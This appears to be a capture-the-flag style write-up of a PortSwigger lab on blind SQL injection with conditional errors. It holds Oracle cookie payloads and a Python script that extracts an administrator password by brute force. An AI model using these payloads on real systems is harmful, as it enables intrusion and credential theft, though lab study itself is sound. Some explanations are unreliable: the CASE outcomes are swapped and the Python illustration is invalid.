# Blind SQL injection with conditional errors

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors), you'll learn: Blind SQL injection with conditional errors! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-12/images/Pasted%20image%2020221207042013.png)

**Tracking cookie:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-12/images/Pasted%20image%2020221207042023.png)

In the previous labs, we found that there is **a blind SQL injection vulnerability in the tracking cookie.**

**Let's try to modify the tracking cookie to a SQL injection payload!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-12/images/Pasted%20image%2020221207042438.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-12/images/Pasted%20image%2020221207042500.png)

Umm... Nothing happends??

Let's take a step back.

**If we try to inject different boolean value(`True`/`False`), it makes no difference to the application's responses.**

**In that case, we can try to trigger an error:**
```sql
# Payload 1, triggering an unclosed quotation mark error 
YOUR_TRACKINGID'

# Payload 2, no error
YOUR_TRACKINGID''
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-12/images/Pasted%20image%2020221207044723.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-12/images/Pasted%20image%2020221207044743.png)

We indeed triggered an error.

**Next, we need to find out it's really doing a SQL query:**
```sql
3UMSejaDQcnYpBjx'||(SELECT '')||'
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-12/images/Pasted%20image%2020221207045351.png)

Still error?? Looks like it's using Oracle database. In SQL injection [lab 7](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-7/README.md), we found that Oracle database **must have `FROM` clause in `SELECT` statement.**

To solve this problem, **we can use the `dual` in-memory table:**

```sql
3UMSejaDQcnYpBjx'||(SELECT '' FROM dual)||'
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-12/images/Pasted%20image%2020221207045557.png)

No error this time!

Now, we can confirm that it's vulnerable to **conditional error-based SQL injection**!

**Also, for the sake of automation, I'll write a simple python script:**
```py
#!/usr/bin/env python3

import requests

url = 'https://0ab600a003b6a83bc3051eae001f006b.web-security-academy.net/'

trackingid = 'YOUR_TRACKINGID'
payload = f"""{trackingid}PAYLOAD_HERE"""

cookie = {
	'session': 'YOUR_SESSIONID',
	'TrackingId': payload
}

r = requests.get(url, cookies=cookie)

if r.status_code == 200:
	print('No error')
else:
	print('Error occurred')
```

Then, the lab background provided a table called `users`, and it has 2 columns: `username` and `password`.

**Hmm... What if I provided a table that doesn't exist?**
```py
payload = f"""{trackingid}'||(SELECT '' FROM faketable)||'"""
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-12]
└─# python3 exploit.py
Error occurred
```

**Then what about a real table?**
```py
payload = f"""{trackingid}'||(SELECT '' FROM users WHERE ROWNUM = 1)||'"""
```

> Note: The `WHERE ROWNUM = 1` condition is to prevent the query from returning more than one row.

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-12]
└─# python3 exploit.py
No error
```

**Can confirm it has a table called `users`!**

**Moreover, we can try to do test conditions:**
```py
# Payload 1:
payload = f"""{trackingid}'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"""

# Payload 2:
payload = f"""{trackingid}'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"""
```

```
# Payload 1:
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-12]
└─# python3 exploit.py
Error occurred

# Payload 2:
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-12]
└─# python3 exploit.py
No error
```

**The `CASE` statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false.**

- In the payload 1, the `CASE` expression evaluates to `'a'`, which does not cause any error.
- In the payload 2, it evaluates to `1/0`, which causes a divide-by-zero error.

**If you found that the above SQL queries are confusing, let's convert those to python:**
```py
# Payload 1:
if 1 = 1: # Always True
	print(1 / 0) # divide-by-zero error
else:
	print('a')

# Payload 2:
if 1 = 2: # Always False
	print(1 / 0)
else:
	print('a')
```

**Armed with above information, we can find `administrator`'s `username` and brute force the `password`!**
```py
payload = f"""{trackingid}'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"""
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-12]
└─# python3 exploit.py
Error occurred
```

**If 1 is equals 1 (Which always does), then it'll trigger a divide-by-zero error.**

**Now we can confirm there is a `username` column and `administrator` is a valid username.**

**Then, we could find the length of `administrator` password:**
```py
# Payload 1:
payload = f"""{trackingid}'||(SELECT CASE WHEN LENGTH(password)>19 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"""

# Payload 2:
payload = f"""{trackingid}'||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"""
```

```
# Payload 1:
# 20 > 19
# 20 is greater than 19
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-12]
└─# python3 exploit.py
Error occurred

# Payload 2:
# 20 > 20
# 20 NOT greater than 20
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-12]
└─# python3 exploit.py
No error
```

**As you can see, we have no error when the length of the password is greater than 20, which means `administrator` password length is 20.**

**Next, we can brute force `administrator` password!**
```py
#!/usr/bin/env python3

import requests
from string import ascii_lowercase, digits

def main():
	url = 'https://0ab600a003b6a83bc3051eae001f006b.web-security-academy.net/'
	trackingid = 'YOUR_TRACKINGID'

	chars = ascii_lowercase + digits
	position = 1
	password = ''

	try:
		while True:
			for character in chars:
				payload = f"""{trackingid}'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{character}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"""

				cookie = {
					'session': 'YOUR_SESSIONID',
					'TrackingId': payload
				}

				r = requests.get(url, cookies=cookie)

				if r.status_code == 200:
					# print('Error occurred')
					continue
				else:
					# print('No error')
					position += 1
					password += ''.join(character)
					print(f'[+] Found password: {password}', end='\r')
					break

			if len(password) >= 20:
				print(f'[+] administrator password: {password}')
				exit()
	except KeyboardInterrupt:
		print('\n[*] Bye!')

if __name__ == '__main__':
	main()
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/SQL-Injection/SQLi-12]
└─# python3 exploit.py
[+] administrator password: 9i0d8hz9bqnm3cyqqivy
```

**Found it! Let's login as `administrator`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-12/images/Pasted%20image%2020221207054059.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-12/images/Pasted%20image%2020221207054114.png)

We're `administrator`!

# What we've learned:

1. Blind SQL injection with conditional errors